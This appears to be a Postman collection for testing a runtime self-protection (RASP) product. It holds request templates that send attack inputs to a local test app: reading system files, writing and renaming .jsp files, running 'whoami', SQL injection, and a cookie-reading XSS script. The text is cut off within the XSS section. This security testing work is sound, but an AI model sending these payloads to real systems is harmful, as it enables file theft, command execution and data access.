@@ -1,0 +1,3019 @@
+{
+	"info": {
+		"_postman_id": "64811e28-c280-4e89-be45-ff98e75966fa",
+		"name": "RASP",
+		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "01. 文件系统",
+			"item": [
+				{
+					"name": "任意文件读取",
+					"item": [
+						{
+							"name": "FileinputStream",
+							"item": [
+								{
+									"name": "GET请求",
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "http://localhost:8000/FileSystem/get/fileInputStreamReadFile.do?file=/etc/ntp.conf",
+											"protocol": "http",
+											"host": [
+												"localhost"
+											],
+											"port": "8000",
+											"path": [
+												"FileSystem",
+												"get",
+												"fileInputStreamReadFile.do"
+											],
+											"query": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf"
+												}
+											]
+										}
+									},
+									"response": []
+								},
+								{
+									"name": "POST请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/fileInputStreamReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Cookie请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "Cookie",
+												"value": "file=/etc/ntp.conf",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/cookie/fileInputStreamReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Header请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "file",
+												"value": "/etc/ntp.conf",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/header/fileInputStreamReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "JSON请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\"file\": \"/etc/ntp.conf\"}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": "http://localhost:8000/FileSystem/json/fileInputStreamReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Form请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "formdata",
+											"formdata": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/fileInputStreamReadFile.do"
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "RandomAccess",
+							"item": [
+								{
+									"name": "GET请求",
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "http://localhost:8000/FileSystem/get/randomAccessFileReadFile.do?file=/etc/ntp.conf",
+											"protocol": "http",
+											"host": [
+												"localhost"
+											],
+											"port": "8000",
+											"path": [
+												"FileSystem",
+												"get",
+												"randomAccessFileReadFile.do"
+											],
+											"query": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf"
+												}
+											]
+										}
+									},
+									"response": []
+								},
+								{
+									"name": "POST请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/randomAccessFileReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Cookie请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "Cookie",
+												"value": "file=/etc/ntp.conf",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/cookie/randomAccessFileReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Header请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "file",
+												"value": "/etc/ntp.conf",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/header/randomAccessFileReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "JSON请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\"file\": \"/etc/ntp.conf\"}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": "http://localhost:8000/FileSystem/json/randomAccessFileReadFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Form请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "formdata",
+											"formdata": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/randomAccessFileReadFile.do"
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "Files",
+							"item": [
+								{
+									"name": "GET请求",
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "http://localhost:8000/FileSystem/get/filesReadAllBytes.do?file=/etc/ntp.conf",
+											"protocol": "http",
+											"host": [
+												"localhost"
+											],
+											"port": "8000",
+											"path": [
+												"FileSystem",
+												"get",
+												"filesReadAllBytes.do"
+											],
+											"query": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf"
+												}
+											]
+										}
+									},
+									"response": []
+								},
+								{
+									"name": "POST请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/filesReadAllBytes.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Cookie请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "Cookie",
+												"value": "file=/etc/ntp.conf",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/cookie/filesReadAllBytes.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Header请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "file",
+												"value": "/etc/ntp.conf",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/header/filesReadAllBytes.do"
+									},
+									"response": []
+								},
+								{
+									"name": "JSON请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\"file\": \"/etc/ntp.conf\"}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": "http://localhost:8000/FileSystem/json/filesReadAllBytes.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Form请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "formdata",
+											"formdata": [
+												{
+													"key": "file",
+													"value": "/etc/ntp.conf",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/filesReadAllBytes.do"
+									},
+									"response": []
+								}
+							]
+						}
+					]
+				},
+				{
+					"name": "任意⽂件编辑",
+					"item": [
+						{
+							"name": "FileOutputStream",
+							"item": [
+								{
+									"name": "GET请求",
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "http://localhost:8000/FileSystem/get/fileOutStreamWriteFile.do?file=test.jsp&content=test",
+											"protocol": "http",
+											"host": [
+												"localhost"
+											],
+											"port": "8000",
+											"path": [
+												"FileSystem",
+												"get",
+												"fileOutStreamWriteFile.do"
+											],
+											"query": [
+												{
+													"key": "file",
+													"value": "test.jsp"
+												},
+												{
+													"key": "content",
+													"value": "test"
+												}
+											]
+										}
+									},
+									"response": []
+								},
+								{
+									"name": "POST请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "file",
+													"value": "test.jsp",
+													"type": "text"
+												},
+												{
+													"key": "content",
+													"value": "test",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/fileOutStreamWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Cookie请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "Cookie",
+												"value": "file=test.jsp; content=test",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/cookie/fileOutStreamWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Header请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "file",
+												"value": "test.jsp",
+												"type": "text"
+											},
+											{
+												"key": "content",
+												"value": "test",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/header/fileOutStreamWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "JSON请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\"file\": \"test.jsp\", \"content\": \"test\"}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": "http://localhost:8000/FileSystem/json/fileOutStreamWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Form请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "formdata",
+											"formdata": [
+												{
+													"key": "file",
+													"value": "test.jsp",
+													"type": "text"
+												},
+												{
+													"key": "content",
+													"value": "test",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/fileOutStreamWriteFile.do"
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "RandomAccessFile",
+							"item": [
+								{
+									"name": "GET请求",
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "http://localhost:8000/FileSystem/get/randomAccessFileWriteFile.do?file=test.jsp&content=test",
+											"protocol": "http",
+											"host": [
+												"localhost"
+											],
+											"port": "8000",
+											"path": [
+												"FileSystem",
+												"get",
+												"randomAccessFileWriteFile.do"
+											],
+											"query": [
+												{
+													"key": "file",
+													"value": "test.jsp"
+												},
+												{
+													"key": "content",
+													"value": "test"
+												}
+											]
+										}
+									},
+									"response": []
+								},
+								{
+									"name": "POST请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "file",
+													"value": "test.jsp",
+													"type": "text"
+												},
+												{
+													"key": "content",
+													"value": "test",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/randomAccessFileWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Cookie请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "Cookie",
+												"value": "file=test.jsp; content=test",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/cookie/randomAccessFileWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Header请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "file",
+												"value": "test.jsp",
+												"type": "text"
+											},
+											{
+												"key": "content",
+												"value": "test",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/header/randomAccessFileWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "JSON请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\"file\": \"test.jsp\", \"content\": \"test\"}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": "http://localhost:8000/FileSystem/json/randomAccessFileWriteFile.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Form请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "formdata",
+											"formdata": [
+												{
+													"key": "file",
+													"value": "test.jsp",
+													"type": "text"
+												},
+												{
+													"key": "content",
+													"value": "test",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/randomAccessFileWriteFile.do"
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "Files",
+							"item": [
+								{
+									"name": "GET请求",
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "http://localhost:8000/FileSystem/get/filesWrite.do?file=test.jsp&content=test",
+											"protocol": "http",
+											"host": [
+												"localhost"
+											],
+											"port": "8000",
+											"path": [
+												"FileSystem",
+												"get",
+												"filesWrite.do"
+											],
+											"query": [
+												{
+													"key": "file",
+													"value": "test.jsp"
+												},
+												{
+													"key": "content",
+													"value": "test"
+												}
+											]
+										}
+									},
+									"response": []
+								},
+								{
+									"name": "POST请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "file",
+													"value": "test.jsp",
+													"type": "text"
+												},
+												{
+													"key": "content",
+													"value": "test",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/filesWrite.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Cookie请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "Cookie",
+												"value": "file=test.jsp; content=test",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/cookie/filesWrite.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Header请求",
+									"request": {
+										"method": "POST",
+										"header": [
+											{
+												"key": "file",
+												"value": "test.jsp",
+												"type": "text"
+											},
+											{
+												"key": "content",
+												"value": "test",
+												"type": "text"
+											}
+										],
+										"url": "http://localhost:8000/FileSystem/header/filesWrite.do"
+									},
+									"response": []
+								},
+								{
+									"name": "JSON请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\"file\": \"test.jsp\", \"content\": \"test\"}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": "http://localhost:8000/FileSystem/json/filesWrite.do"
+									},
+									"response": []
+								},
+								{
+									"name": "Form请求",
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "formdata",
+											"formdata": [
+												{
+													"key": "file",
+													"value": "test.jsp",
+													"type": "text"
+												},
+												{
+													"key": "content",
+													"value": "test",
+													"type": "text"
+												}
+											]
+										},
+										"url": "http://localhost:8000/FileSystem/post/filesWrite.do"
+									},
+									"response": []
+								}
+							]
+						}
+					]
+				},
+				{
+					"name": "任意⽂件删除",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/FileSystem/get/deleteFile.do?file=./1.txt",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"FileSystem",
+										"get",
+										"deleteFile.do"
+									],
+									"query": [
+										{
+											"key": "file",
+											"value": "./1.txt"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "file",
+											"value": "./1.txt",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/deleteFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "file=./1.txt",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/cookie/deleteFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "file",
+										"value": "./1.txt",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/header/deleteFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"file\": \"./1.txt\"}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/FileSystem/json/deleteFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "file",
+											"value": "./1.txt",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/deleteFile.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "任意⽂件重命名",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/FileSystem/get/renameTo.do?file=1.txt&dest=1.jsp",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"FileSystem",
+										"get",
+										"renameTo.do"
+									],
+									"query": [
+										{
+											"key": "file",
+											"value": "1.txt"
+										},
+										{
+											"key": "dest",
+											"value": "1.jsp"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "file",
+											"value": "1.txt",
+											"type": "text"
+										},
+										{
+											"key": "dest",
+											"value": "1.jsp",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/renameTo.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "file=1.txt; dest=1.jsp",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/cookie/renameTo.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "file",
+										"value": "1.txt",
+										"type": "text"
+									},
+									{
+										"key": "dest",
+										"value": "1.jsp",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/header/renameTo.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"file\": \"1.txt\", \"dest\": \"1.jsp\"}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/FileSystem/json/renameTo.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "file",
+											"value": "1.txt",
+											"type": "text"
+										},
+										{
+											"key": "dest",
+											"value": "1.jsp",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/renameTo.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "任意⽂件复制",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/FileSystem/get/filesCopy.do?file=1.txt&dest=1.jsp",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"FileSystem",
+										"get",
+										"filesCopy.do"
+									],
+									"query": [
+										{
+											"key": "file",
+											"value": "1.txt"
+										},
+										{
+											"key": "dest",
+											"value": "1.jsp"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "file",
+											"value": "1.txt",
+											"type": "text"
+										},
+										{
+											"key": "dest",
+											"value": "1.jsp",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/filesCopy.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "file=1.txt; dest=1.jsp",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/cookie/filesCopy.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "file",
+										"value": "1.txt",
+										"type": "text"
+									},
+									{
+										"key": "dest",
+										"value": "1.jsp",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/header/filesCopy.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"file\": \"1.txt\", \"dest\": \"1.jsp\"}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/FileSystem/json/filesCopy.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "file",
+											"value": "1.txt",
+											"type": "text"
+										},
+										{
+											"key": "dest",
+											"value": "1.jsp",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/filesCopy.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "任意目录遍历",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/FileSystem/get/listFile.do?dir=/usr",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"FileSystem",
+										"get",
+										"listFile.do"
+									],
+									"query": [
+										{
+											"key": "dir",
+											"value": "/usr"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "dir",
+											"value": "/usr",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/listFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "dir=/usr",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/cookie/listFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "dir",
+										"value": "/usr",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/FileSystem/header/listFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"dir\": \"/usr\"}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/FileSystem/json/listFile.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "dir",
+											"value": "/usr",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/FileSystem/post/listFile.do"
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "02. 本地命令执行",
+			"item": [
+				{
+					"name": "ProcessBuilder",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/CMD/get/cmd.do?cmd=whoami",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"CMD",
+										"get",
+										"cmd.do"
+									],
+									"query": [
+										{
+											"key": "cmd",
+											"value": "whoami"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "cmd",
+											"value": "whoami",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/CMD/post/cmd.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "cmd=whoami",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/CMD/cookie/cmd.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "cmd",
+										"value": "whoami",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/CMD/header/cmd.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"cmd\": \"whoami\"}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/CMD/json/cmd.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "cmd",
+											"value": "whoami",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/CMD/post/cmd.do"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "UnixProcess",
+					"item": [
+						{
+							"name": "GET请求",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "http://localhost:8000/CMD/get/unixProcess.do?cmd=whoami",
+									"protocol": "http",
+									"host": [
+										"localhost"
+									],
+									"port": "8000",
+									"path": [
+										"CMD",
+										"get",
+										"unixProcess.do"
+									],
+									"query": [
+										{
+											"key": "cmd",
+											"value": "whoami"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "cmd",
+											"value": "whoami",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/CMD/post/unixProcess.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Cookie请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Cookie",
+										"value": "cmd=whoami",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/CMD/cookie/unixProcess.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Header请求",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "cmd",
+										"value": "whoami",
+										"type": "text"
+									}
+								],
+								"url": "http://localhost:8000/CMD/header/unixProcess.do"
+							},
+							"response": []
+						},
+						{
+							"name": "JSON请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\"cmd\": \"whoami\"}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": "http://localhost:8000/CMD/json/unixProcess.do"
+							},
+							"response": []
+						},
+						{
+							"name": "Form请求",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "formdata",
+									"formdata": [
+										{
+											"key": "cmd",
+											"value": "whoami",
+											"type": "text"
+										}
+									]
+								},
+								"url": "http://localhost:8000/CMD/post/unixProcess.do"
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "03. SQL注入",
+			"item": [
+				{
+					"name": "GET请求",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8000/SQL/get/sql.do?username='/**/or/**/username='root",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "8000",
+							"path": [
+								"SQL",
+								"get",
+								"sql.do"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "'/**/or/**/username='root"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "POST请求",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "'/**/or/**/username='root",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/SQL/post/sql.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Cookie请求",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Cookie",
+								"value": "username='/**/or/**/username='admin",
+								"type": "text"
+							}
+						],
+						"url": "http://localhost:8000/SQL/cookie/sql.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Header请求",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "username",
+								"value": "'/**/or/**/username='root",
+								"type": "text"
+							}
+						],
+						"url": "http://localhost:8000/SQL/header/sql.do"
+					},
+					"response": []
+				},
+				{
+					"name": "JSON请求",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"username\": \"'/**/or/**/username='root\"}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": "http://localhost:8000/SQL/json/sql.do"
+					},
+					"response": []
+				},
+				{
+					"name": "Form请求",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "username",
+									"value": "'/**/or/**/username='root",
+									"type": "text"
+								}
+							]
+						},
+						"url": "http://localhost:8000/SQL/post/sql.do"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "04. XSS",
+			"item": [
+				{
+					"name": "GET请求",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8000/XSS/get/xss.do?str=<script>alert(document.cookie)</script>",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "8000",
+							"path": [
+								"XSS",
+								"get",
+								"xss.do"
+							],
+							"query": [
+								{
+									"key": "str",
+									"value": "<script>alert(document.cookie)</script>"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "POST请求",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
